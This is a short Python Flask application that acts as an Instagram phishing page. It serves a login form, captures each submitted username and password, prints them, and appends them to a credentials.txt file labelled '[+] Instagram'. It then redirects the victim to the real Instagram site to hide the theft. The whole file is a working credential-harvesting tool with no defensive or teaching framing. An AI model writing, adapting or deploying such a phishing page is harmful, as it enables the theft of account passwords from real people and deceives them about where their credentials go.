from flask import Flask, render_template, request, redirect, send_from_directory
import os

app = Flask(__name__)

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/images/<path:filename>')
def serve_image(filename):
    images_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'images')
    return send_from_directory(images_dir, filename)

@app.route('/login', methods=['POST'])
def login_post():
    username = request.form.get('username')
    password = request.form.get('password')
    

    print(f"[Login] Username: {username}, Password: {password}",flush=True)
    # path=r'../credentials.txt'
    with open("credentials.txt","a") as file:
        file.write("[+] Instagram:\n")
        file.write(f"   Username:{username}  ,  Password:{password}\n")
        file.close()

    return redirect('https://www.instagram.com')

if __name__ == '__main__':
    app.run(debug=True, port=5000)
